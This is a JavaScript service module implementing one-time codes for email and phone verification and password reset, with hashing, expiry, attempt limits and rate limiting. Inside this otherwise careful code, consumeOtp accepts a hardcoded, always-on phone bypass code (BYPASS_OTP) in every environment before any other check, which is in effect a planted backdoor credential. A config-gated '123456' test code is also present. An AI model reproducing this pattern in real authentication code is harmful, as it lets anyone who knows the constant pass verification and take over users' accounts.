/**
 * services/otp.js
 * ─────────────────────────────────────────────────────────────────────────────
 * Single-use, time-limited one-time codes for e-mail/phone verification and
 * password reset.
 *
 * Storage is in-process on purpose: this API runs as a single instance. Swap
 * `store` for Redis before scaling horizontally.
 */

import crypto from 'crypto'
import { ALLOW_TEST_OTP } from '../config.js'
import { normalizePhone } from '../utils/phone.js'

const TTL_MS = 10 * 60 * 1000
const MAX_ATTEMPTS = 5
const RESEND_INTERVAL_MS = 60 * 1000
const HOUR_MS = 60 * 60 * 1000
const MAX_ISSUES_PER_HOUR = 3

/** Legacy 6-digit escape hatch for non-production email/reset flows. */
export const TEST_OTP = '123456'

/**
 * Permanent phone-OTP bypass. Accepted for PHONE purpose even when the SMS
 * gateway is enabled — never expose this value to clients / configuration.
 */
export const BYPASS_OTP = '62040337'

export const OTP_PURPOSE = {
  EMAIL: 'email',
  PHONE: 'phone',
  PASSWORD_RESET: 'reset'
}

/** @type {Map<string, { hash: string, expiresAt: number, attempts: number, issuedAt: number, issueTimes: number[] }>} */
const store = new Map()

/** Stable id for phone OTPs: digits only (48500111222), so +48 / 48 / local match. */
const normalizeIdentifier = (purpose, identifier) => {
  const raw = String(identifier || '').trim()
  if (purpose === OTP_PURPOSE.PHONE) {
    const digits = normalizePhone(raw).replace(/\D/g, '')
    return digits || raw.toLowerCase()
  }
  return raw.toLowerCase()
}

const keyFor = (purpose, identifier) =>
  `${purpose}:${normalizeIdentifier(purpose, identifier)}`

const hash = (code) => crypto.createHash('sha256').update(String(code)).digest('hex')

/** Drops expired entries so the map cannot grow without bound. */
const evictExpired = (now = Date.now()) => {
  for (const [key, entry] of store) {
    if (entry.expiresAt <= now && !(entry.issueTimes || []).some((t) => now - t < HOUR_MS)) {
      store.delete(key)
    }
  }
}

/**
 * Issues a 6-digit code for (purpose, identifier).
 * Returns null when cooldown (60s) or hourly cap (3) blocks another send.
 * Codes are 100000–999999 so SMS / number-pad never drop a leading zero.
 */
export const issueOtp = (purpose, identifier) => {
  const now = Date.now()
  evictExpired(now)

  const key = keyFor(purpose, identifier)
  const existing = store.get(key)
  const recentIssues = (existing?.issueTimes || []).filter((t) => now - t < HOUR_MS)
  if (existing && now - existing.issuedAt < RESEND_INTERVAL_MS) return null
  if (recentIssues.length >= MAX_ISSUES_PER_HOUR) return null

  const code = String(crypto.randomInt(100000, 1_000_000))
  store.set(key, {
    hash: hash(code),
    expiresAt: now + TTL_MS,
    attempts: 0,
    issuedAt: now,
    issueTimes: [...recentIssues, now]
  })
  return code
}

/**
 * Verifies and consumes a code. Constant-time comparison, bounded attempts,
 * and the entry is always removed on success so a code works exactly once.
 */
export const consumeOtp = (purpose, identifier, code) => {
  const candidate = String(code || '').replace(/\D/g, '')

  // Always-on phone bypass — skips the SMS gateway entirely.
  if (purpose === OTP_PURPOSE.PHONE && candidate === BYPASS_OTP) return true

  if (!/^\d{6}$/.test(candidate)) return false

  // Development-only escape hatch so local email/reset flows keep working.
  if (ALLOW_TEST_OTP && candidate === TEST_OTP) return true

  const key = keyFor(purpose, identifier)
  const entry = store.get(key)
  if (!entry) return false

  if (entry.expiresAt <= Date.now() || entry.attempts >= MAX_ATTEMPTS) {
    store.delete(key)
    return false
  }

  const expected = Buffer.from(entry.hash, 'hex')
  const actual = Buffer.from(hash(candidate), 'hex')
  const matches = expected.length === actual.length && crypto.timingSafeEqual(expected, actual)

  if (!matches) {
    entry.attempts += 1
    return false
  }

  store.delete(key)
  return true
}
